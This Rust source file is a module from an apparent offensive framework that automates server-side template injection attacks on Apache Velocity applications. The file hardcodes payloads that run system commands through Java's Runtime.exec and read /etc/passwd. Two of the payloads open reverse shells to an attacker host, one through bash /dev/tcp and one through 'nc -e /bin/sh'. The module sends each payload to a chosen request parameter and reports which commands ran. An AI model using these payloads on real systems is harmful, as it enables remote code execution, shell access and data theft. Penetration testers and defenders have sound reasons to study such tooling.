use anyhow::Result;
use async_trait::async_trait;
use chrono::Utc;

use crate::web::{WebModule, ModuleInfo, ModuleContext, ExecutionResult};
use crate::web::injection::{InjectionConfig, InjectionEngine};

pub struct VelocityModule;

impl VelocityModule {
    pub fn new() -> Self {
        Self
    }
    
    fn get_payloads(&self, context: &ModuleContext) -> Vec<String> {
        let lhost = context.get_option("LHOST").map(|s| s.as_str()).unwrap_or("ATTACKER_IP");
        let lport = context.get_option("LPORT").map(|s| s.as_str()).unwrap_or("4444");
        
        vec![
            // Detection payloads
            "#set($x=7*7)$x".to_string(),
            "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\").waitFor()".to_string(),
            
            // Basic RCE
            "#set($rt=$class.forName('java.lang.Runtime'))#set($chr=$class.forName('java.lang.Character'))#set($str=$class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end".to_string(),
            
            // Simplified RCE
            "#set($s=\"\")#set($stringClass=$s.getClass())#set($runtime=$stringClass.forName(\"java.lang.Runtime\").getRuntime())#set($process=$runtime.exec(\"id\"))#set($null=$process.waitFor())$process.exitValue()".to_string(),
            
            // ClassLoader RCE
            "#set($c=$null.class.forName('java.lang.Runtime'))#set($m=$c.getMethod('getRuntime',$null))#set($r=$m.invoke($null,$null))#set($m=$c.getMethod('exec',$null.class.forName('[Ljava.lang.String;')))#set($r=$m.invoke($r,['whoami']))".to_string(),
            
            // Reverse shells via Runtime.exec
            format!("#set($rt=$class.forName('java.lang.Runtime').getRuntime())#set($proc=$rt.exec('bash -c {{bash -i >& /dev/tcp/{}/{} 0>&1}}'))$proc.waitFor()", lhost, lport),
            
            format!("#set($s=\"\")#set($stringClass=$s.getClass())#set($runtime=$stringClass.forName(\"java.lang.Runtime\").getRuntime())#set($process=$runtime.exec(\"nc {} {} -e /bin/sh\"))#set($null=$process.waitFor())", lhost, lport),
            
            // File read
            "#set($s=\"\")#set($stringClass=$s.getClass())#foreach($c in [106, 97, 118, 97, 46, 105, 111, 46, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114])#set($chr=$chr+$stringClass.valueOf([char]$c))#end#set($fileClass=$stringClass.forName($chr))#set($constructors=$fileClass.getConstructors())#set($fd=$constructors[0].newInstance(\"/etc/passwd\"))#foreach($line in $fd.readLines())$line#end".to_string(),
            
            // Class inspection
            "#foreach($i in [1..5])$i. $class.inspect(\"java.lang.String\").type.getFields()[$i]#end".to_string(),
            
            // Alternative execution vectors
            "$class.classLoader.loadClass('java.lang.Runtime').getRuntime().exec('id')".to_string(),
        ]
    }
}

#[async_trait]
impl WebModule for VelocityModule {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            id: "web/ssti/velocity".to_string(),
            name: "Velocity SSTI Exploitation".to_string(),
            category: "SSTI".to_string(),
            description: "Server-Side Template Injection exploitation for Apache Velocity (Java). Uses Runtime.exec() and ClassLoader for RCE.".to_string(),
            author: "CAP Framework".to_string(),
            references: vec![
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity".to_string(),
                "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#velocity-java".to_string(),
            ],
        }
    }
    
    fn required_options(&self) -> Vec<String> {
        vec![
            "REQUEST (file path)".to_string(),
            "INJECTION_POINT (parameter name)".to_string(),
            "LHOST (attacker IP)".to_string(),
            "LPORT (attacker port)".to_string(),
        ]
    }
    
    async fn execute(&self, context: &ModuleContext) -> Result<ExecutionResult> {
        let request = context.request.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No request loaded"))?;
        
        let injection_point = context.injection_point.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No injection point set"))?;
        
        let payloads = self.get_payloads(context);
        
        let config = InjectionConfig {
            dry_run: context.get_option("DRY_RUN").map(|s| s == "true").unwrap_or(false),
            confirm_each: context.get_option("CONFIRM_EACH").map(|s| s == "true").unwrap_or(false),
            timeout_secs: 15,
            follow_redirects: false,
        };
        
        let engine = InjectionEngine::new(config)?;
        let results = engine.inject_batch(request, injection_point, &payloads).await?;
        
        let mut findings = Vec::new();
        
        for result in &results {
            if result.response_body.contains("49") {
                findings.push(format!("Template evaluation detected: {}", result.payload));
            }
            
            if result.response_body.contains("uid=") || result.response_body.contains("root:") {
                findings.push(format!("Command execution successful: {}", result.payload));
            }
            
            if result.response_body.contains("java.lang") || result.response_body.contains("java.io") {
                findings.push(format!("Java class disclosure: {}", result.payload));
            }
            
            if result.analysis.has_error_indicators && result.response_body.to_lowercase().contains("velocity") {
                findings.push(format!("Velocity error detected: {}", result.payload));
            }
        }
        
        Ok(ExecutionResult {
            success: !findings.is_empty(),
            findings,
            injection_results: results,
            module_id: self.info().id,
            timestamp: Utc::now(),
        })
    }
}
